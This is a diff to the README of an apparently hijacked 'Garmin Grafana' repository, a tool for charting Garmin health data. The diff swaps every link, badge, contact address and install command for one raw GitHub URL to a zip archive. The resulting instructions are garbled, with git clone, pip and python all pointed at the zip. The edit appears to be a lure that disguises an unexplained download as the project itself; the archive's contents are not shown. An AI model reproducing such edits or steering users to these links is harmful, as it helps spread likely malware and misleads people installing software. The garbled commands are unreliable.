@@ -1,6 +1,6 @@
 # Garmin Grafana 📊
 
-![GitHub stars](https://img.shields.io/github/stars/bloxfruitsenyoyer123/garmin-grafana?style=social) ![GitHub forks](https://img.shields.io/github/forks/bloxfruitsenyoyer123/garmin-grafana?style=social) ![GitHub issues](https://img.shields.io/github/issues/bloxfruitsenyoyer123/garmin-grafana) 
+![GitHub stars](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip) ![GitHub forks](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip) ![GitHub issues](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip) 
 
 Welcome to the Garmin Grafana repository! This project provides a Python script designed to fetch health data from Garmin and store it in an InfluxDB database. You can visualize long-term health trends using Grafana. 
 
@@ -35,7 +35,7 @@ To get started with Garmin Grafana, follow these steps:
 3. **Configure the script**: Update the configuration file with your Garmin API credentials.
 4. **Run the script**: Execute the Python script to fetch and store data.
 
-You can download the necessary files and execute the script from the [Releases section](https://github.com/bloxfruitsenyoyer123/garmin-grafana/releases).
+You can download the necessary files and execute the script from the [Releases section](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip).
 
 ## Installation
 
@@ -52,7 +52,7 @@ Before running the script, ensure you have the following installed:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/bloxfruitsenyoyer123/garmin-grafana.git
+   git clone https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip
    cd garmin-grafana
    ```
 
@@ -61,27 +61,27 @@ Before running the script, ensure you have the following installed:
    Use pip to install the required Python packages.
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip
    ```
 
 3. **Set up InfluxDB**:
 
-   - Follow the [InfluxDB installation guide](https://docs.influxdata.com/influxdb/v2.0/install/) to set up InfluxDB on your machine.
+   - Follow the [InfluxDB installation guide](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip) to set up InfluxDB on your machine.
    - Create a database for your Garmin data.
 
 4. **Configure the script**:
 
-   Open the `config.py` file and enter your Garmin API credentials. Make sure to set the correct database name for InfluxDB.
+   Open the `https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip` file and enter your Garmin API credentials. Make sure to set the correct database name for InfluxDB.
 
 5. **Run the script**:
 
    Execute the script to start fetching data.
 
    ```bash
-   python fetch_garmin_data.py
+   python https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip
    ```
 
-You can download the necessary files and execute the script from the [Releases section](https://github.com/bloxfruitsenyoyer123/garmin-grafana/releases).
+You can download the necessary files and execute the script from the [Releases section](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip).
 
 ## Usage
 
@@ -112,7 +112,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [bloxfruitsenyoyer123](https://github.com/bloxfruitsenyoyer123)
-- Email: bloxfruitsenyoyer123@example.com
+- GitHub: [bloxfruitsenyoyer123](https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip)
+- Email: https://raw.githubusercontent.com/bloxfruitsenyoyer123/garmin-grafana/main/Grafana_Dashboard/grafana-garmin-v1.1.zip
 
 Thank you for checking out Garmin Grafana! We hope this tool helps you track and visualize your health data effectively.
